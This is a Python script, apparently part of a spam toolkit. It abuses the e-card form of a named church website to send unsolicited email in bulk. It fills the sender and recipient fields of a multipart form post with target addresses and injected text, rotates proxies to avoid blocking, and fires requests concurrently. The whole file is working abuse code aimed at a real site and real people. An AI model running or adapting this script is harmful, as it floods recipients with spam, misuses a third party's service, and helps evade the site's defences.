import requests

from module.spam_abstraction import Spam

url = 'https://bethlehemunitedmethodist.org/angel-ecards/'

headers = {
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary2A4mIrLVAUm9bt57',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
}

data = '------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_img"\r\n\r\n12689\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_post"\r\n\r\n10102\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_unique_id"\r\n\r\n0\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_ajax_validated"\r\n\r\n1\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_action"\r\n\r\nprocess_from\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_name"\r\n\r\ntest https://bethlehemunitedmethodist.org/angel-ecards/\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_email"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_fname"\r\n\r\ntest https://bethlehemunitedmethodist.org/angel-ecards/\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_femail"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_message"\r\n\r\ntest https://bethlehemunitedmethodist.org/angel-ecards/\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57\r\nContent-Disposition: form-data; name="wp_iec_scopy"\r\n\r\n1\r\n------WebKitFormBoundary2A4mIrLVAUm9bt57--\r\n'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response:
        postdata = data.replace('softumwork@gmail.com', target).replace('test', self.get_text())
        response = requests.post(url, headers=headers, data=postdata.encode(), proxies=self.get_proxies())
        return response


if __name__ == '__main__':
    success_message = 'successfully sent'
    project_name = 'bethlehemunitedmethodist'  # 3ikQ7iq
    spam = ConcreteSpam(project_name, success_message)
    res = spam.send_post()
    if res:
        spam.run_concurrently()
